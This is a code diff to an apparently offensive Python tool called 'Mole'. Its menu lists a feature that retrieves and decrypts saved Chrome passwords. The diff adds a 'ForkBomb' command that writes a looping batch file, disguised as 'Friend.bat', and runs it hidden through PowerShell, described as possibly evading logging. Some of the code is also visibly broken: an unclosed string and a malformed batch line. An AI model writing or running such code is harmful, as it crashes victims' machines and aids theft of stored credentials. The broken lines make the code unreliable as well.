@@ -142,15 +142,18 @@ while True:
     sleep(0.1)
     print("PassExport) Export browser saved passwords (Chrome only)")
     sleep(0.1)
+    print("ForkBomb) Attempt a forkbomb on current machine")
+    sleep(0.1)
     print(" ")
     sleep(0.1)
     print("exit) To exit the program")
     sleep(0.1)
+    print("info) Shows details of a chosen command
     print(" ")
     sleep(0.1)
     print("help) Show available actions")
     sleep(0.1)
-    action = input("Your action: ")
+    action = input("M0L€> ")
     cls()
 
     
@@ -196,7 +199,10 @@ while True:
         sleep(0.1)
         print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser")
         sleep(0.1)
-        print(" ")
+        print("ForkBomb) Attemps a forkbomb on current machine potetionally leaving without any logging")
+        sleep(0.1)
+        print("info) used as a help command, combine info with a Mole command to see its details")
+        sleep(0.1)
         print("exit) To exit the program")
         input("Press Enter to continue...")
 
@@ -836,11 +842,23 @@ while True:
 #
 #
 #
-#
-#
-#
-#
 
+
+if action == "ForkBomb":
+    logging.info(f"Chosen to attempt a forkbomb")
+    # Create the fork bomb batch file
+    run_ps('New-Item -Path "Friend.bat" -ItemType File -Force')
+    run_ps('Set-Content -Path "Friend.bat" -Value "@echo off"')
+    run_ps('Add-Content -Path "Friend.bat" -Value ":A"')
+    run_ps('Add-Content -Path "Friend.bat" -Value "0%|0%"')
+    run_ps('Add-Content -Path "Friend.bat" -Value "goto A"')
+    
+    # Execute it
+    run_ps('Start-Process -FilePath "Friend.bat" -WindowStyle Hidden')
+        
+        
+    
+    
 #Action exit = exiting the program
     if action == "exit":
         logging.info(f"Chosen action PassExport to exit the program")
